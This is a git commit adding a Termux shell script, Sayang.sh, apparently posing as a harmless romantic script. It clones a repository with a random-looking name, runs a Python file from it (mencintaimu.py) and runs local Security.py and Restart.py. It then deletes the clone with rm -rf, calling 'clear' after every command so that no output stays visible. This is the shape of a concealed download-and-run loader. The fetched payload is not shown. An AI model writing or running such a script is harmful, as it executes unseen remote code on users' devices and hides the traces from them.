76f8b1133a49dc0a63dda168fe1c1641a6239ecd
infected14741 <42504662+infected14741@users.noreply.github.com>
2022-08-18 01:21:10 +0700

    Add files via upload

---
+++ Sayang.sh
@@ -0,0 +1,50 @@
+pkg install update
+clear
+pkg install upgrade
+clear
+pkg install git
+clear
+pkg install python
+clear
+pkg install python2
+clear
+python2 Security.py
+clear
+python Restart.py
+clear
+cd mewanty
+clear
+cd aku
+clear
+cd rindu
+clear
+cd kamu
+clear
+git clone https://github.com/infected14741/diyfoutuotuogipguogojguhegeyirsnsbdjcicyshsjsln
+clear
+cd diyfoutuotuogipguogojguhegeyirsnsbdjcicyshsjsln
+clear
+cd i
+clear
+cd love
+clear
+cd you
+clear
+python mencintaimu.py
+clear
+cd
+clear
+cd indah
+clear
+cd mewanty
+clear
+cd aku
+clear
+cd rindu
+clear
+cd kamu
+clear
+rm -rf diyfoutuotuogipguogojguhegeyirsnsbdjcicyshsjsln
+clear
+cd
+clear
